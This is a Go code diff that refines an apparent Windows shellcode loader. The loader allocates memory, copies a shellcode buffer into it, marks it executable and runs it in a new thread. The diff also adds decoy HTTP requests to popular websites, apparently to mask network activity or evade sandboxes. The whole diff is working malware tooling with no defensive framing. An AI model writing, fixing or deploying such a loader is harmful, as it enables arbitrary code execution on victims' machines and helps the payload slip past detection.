@@ -5,9 +5,9 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	"math/rand"
+	"net/http"
 	"sync"
-	"time"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
@@ -50,7 +50,7 @@ func main() {
 	}
 	f, _, errVirtualAlloc := a.Call(0, uintptr(len(scShell)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+	if errVirtualAlloc != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
 
@@ -65,9 +65,9 @@ func main() {
 	if *dubbe {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
 	}
-	_, _, errRtlCopyMemory := c.Call(f, uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&scShell[0])))), uintptr(len(scShell)))
+	_, _, errRtlCopyMemory := c.Call(f, uintptr(unsafe.Pointer(&scShell[0])), uintptr(len(scShell)))
 
-	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+	if errRtlCopyMemory != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
 	}
 	if *varise {
@@ -79,8 +79,8 @@ func main() {
 	}
 
 	oldProt := PAGE_READWRITE
-	_, _, errVirtualProtect := b.Call(f, uintptr(len(scShell)), PAGE_EXECUTE, uintptr(unsafe.Pointer((*uintptr)(unsafe.Pointer(&oldProt)))))
-	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+	_, _, errVirtualProtect := b.Call(f, uintptr(len(scShell)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&oldProt)))
+	if errVirtualProtect != nil {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
 	if *varise {
@@ -93,7 +93,7 @@ func main() {
 
 	threadID, _, errCreateThread := d.Call(0, 0, f, uintptr(0), 0, 0)
 
-	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
+	if errCreateThread != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
 	}
 	if *varise {
@@ -105,15 +105,18 @@ func main() {
 	}
 
 	_, _, errWaitForSingleObject := e.Call(threadID, 0xFFFFFFFF)
-	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
+	if errWaitForSingleObject != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n%s", errWaitForSingleObject.Error()))
 	}
 }
 
 func requestAlexaDomains() {
 	domains := []string{"www.yandex.ru", "www.google.com", "www.facebook.com"}
+	var wg sync.WaitGroup
 	for i := 0; i < 3; i++ {
+		wg.Add(1)
 		go func(domain string) {
+			defer wg.Done()
 			resp, err := http.Get("https://" + domain + "/")
 			if err != nil {
 				log.Println("Error making request:", err)
@@ -123,9 +126,9 @@ func requestAlexaDomains() {
 			}
 		}(domains[i])
 	}
+	wg.Wait()
 }
 
 func main2() {
 	requestAlexaDomains()
-	sync.WaitGroup{}
 }
